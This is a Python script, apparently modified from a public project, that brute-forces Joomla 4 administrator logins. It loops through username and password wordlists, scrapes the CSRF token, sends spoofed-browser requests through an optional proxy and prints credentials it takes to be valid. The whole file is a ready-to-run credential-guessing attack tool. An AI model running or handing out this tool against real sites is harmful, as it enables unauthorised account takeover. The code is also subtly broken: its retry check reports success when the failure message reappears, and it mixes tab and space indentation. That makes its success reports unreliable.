#!/usr/bin/python3
# Original author: https://github.com/ajnik/joomla-bruteforce
# Modified to work with Joomla 4.1.5

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():

    def __init__(self):
        self.initializeVariables()
        self.sendrequest()

    def initializeVariables(self):
        #Initialize args
        parser = argparse.ArgumentParser(description='Joomla login bruteforce')
        #required
        parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
        parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')

        #optional
        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output.')
        #these two arguments should not be together
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-usr', '--username', type=str, help='One single username')
        group.add_argument('-U', '--userlist', type=str, help='Username list')

        args = parser.parse_args()

        #parse args and save proxy
        if args.proxy:
            parsedproxyurl = urlparse(args.proxy)
            self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
        else:
            self.proxy=None

        #determine if verbose or not
        if args.verbose:
            self.verbose=True
        else:
            self.verbose=False

        #http:/site/administrator
        self.url = args.url +'/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        #Need cookie
        self.cookies = requests.session().get(self.url).cookies.get_dict()
        #Wordlist from args
        self.wordlistfile = args.wordlist
        self.username = args.username
        self.userlist = args.userlist


    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()

    def doGET(self):
    	processed_words = 0  # Initialize the number of processed words
    	for password in self.getdata(self.wordlistfile):
            processed_words += 1 # increment number of processed words

            #Custom user-agent :)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/117.0.5938.132 Safari/537.36'
            }

            #First GET for CSSRF
            r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
            password=password.decode('utf-8')

            data = {
                'username' : self.username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                longstring : 1
            }

            #print(self.url)
            #print(data)
            #print(self.proxy)
            #print(self.cookies)
            #print(headers)
            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
            #print(r)
            soup = BeautifulSoup(r.text, 'html.parser')
            #print(soup)
            print(f'Current Word #{processed_words}: {password}')
            response = soup.find('div', {'class': 'alert alert-warning'})
            print(response)
            # Check if the message is present
    
            if response:
                if self.verbose:
                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
            else:
                # Try one more time just in case this script received an false reading
                r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies, headers=headers)
                soup = BeautifulSoup(r.text, 'html.parser')
                print(f'Trying again on current Word #{processed_words}: {password}')
                if soup.find('div', {'class': 'alert alert-warning'}):
                    print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
                    break
                else:
                    print('Oh well')
                    

    @staticmethod
    def getdata(path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data


joomla = Joomla()
